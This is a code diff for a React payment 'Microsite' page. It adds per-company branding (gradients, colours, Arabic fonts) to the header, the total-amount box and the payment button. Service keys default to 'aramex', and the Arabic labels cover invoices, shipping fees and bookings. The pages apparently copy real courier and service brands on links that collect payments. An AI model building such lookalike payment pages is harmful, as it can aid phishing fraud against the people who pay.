@@ -11,6 +11,7 @@ import { gccShippingServices } from "@/lib/gccShippingServices";
 import { getCompanyMeta } from "@/utils/companyMeta";
 import { getCurrency } from "@/utils/countryData";
 import SEOHead from "@/components/SEOHead";
+import { getBrandingByCompany, getBrandingByServiceType } from "@/lib/brandingSystem";
 import {
   MapPin,
   Users,
@@ -81,6 +82,11 @@ const Microsite = () => {
   const serviceName = payload.service_name || payload.chalet_name;
   const serviceKey = payload.service_key || 'aramex';
   const serviceBranding = getServiceBranding(serviceKey);
+  
+  // Get comprehensive branding system
+  const companyBranding = getBrandingByCompany(serviceKey) || 
+                          getBrandingByServiceType(link.type) ||
+                          null;
 
   // Get dynamic company metadata for OG tags
   const companyMeta = getCompanyMeta(serviceKey);
@@ -159,12 +165,18 @@ const Microsite = () => {
           </div>
           
           {/* Main Card */}
-          <Card className="overflow-hidden shadow-elevated">
-            {/* Header with Country Colors */}
+          <Card 
+            className="overflow-hidden shadow-elevated"
+            style={{
+              borderColor: companyBranding?.colors.border || countryData.primaryColor,
+            }}
+          >
+            {/* Header with Country/Company Colors */}
             <div
               className="h-32 relative"
               style={{
-                background: `linear-gradient(135deg, ${countryData.primaryColor}, ${countryData.secondaryColor})`,
+                background: companyBranding?.gradients.hero || 
+                           `linear-gradient(135deg, ${countryData.primaryColor}, ${countryData.secondaryColor})`,
               }}
             >
               <div className="absolute inset-0 bg-black/20" />
@@ -445,7 +457,15 @@ const Microsite = () => {
               </div>
               
               {/* Total Amount */}
-              <div className="bg-gradient-primary p-6 rounded-xl text-primary-foreground mb-6">
+              <div 
+                className="p-6 rounded-xl text-primary-foreground mb-6"
+                style={{
+                  background: companyBranding?.gradients.primary || 
+                             `linear-gradient(135deg, ${countryData.primaryColor}, ${countryData.secondaryColor})`,
+                  borderRadius: companyBranding?.borderRadius.lg || '12px',
+                  boxShadow: companyBranding?.shadows.md,
+                }}
+              >
                 <p className="text-sm mb-2 opacity-90">
                   {isInvoice ? 'إجمالي الفاتورة' : isHealth ? 'رسوم الحجز' : isLogistics ? 'تكلفة الشحن' : isContracts ? 'قيمة العقد' : 'المبلغ الإجمالي'}
                 </p>
@@ -540,7 +560,15 @@ const Microsite = () => {
               {/* Payment Button */}
               <Button
                 size="lg"
-                className="w-full text-xl py-7 shadow-glow animate-pulse-glow"
+                className="w-full text-xl py-7 animate-pulse-glow"
+                style={{
+                  background: companyBranding?.gradients.primary || 
+                             `linear-gradient(135deg, ${countryData.primaryColor}, ${countryData.secondaryColor})`,
+                  color: companyBranding?.colors.textOnPrimary || '#FFFFFF',
+                  borderRadius: companyBranding?.borderRadius.md || '8px',
+                  boxShadow: companyBranding?.shadows.lg || '0 10px 15px -3px rgba(0, 0, 0, 0.2)',
+                  fontFamily: companyBranding?.fonts.arabic,
+                }}
                 onClick={() => {
                   const companyKey = payload.service_key || 'aramex';
                   const currency = getCurrency(countryData.code);
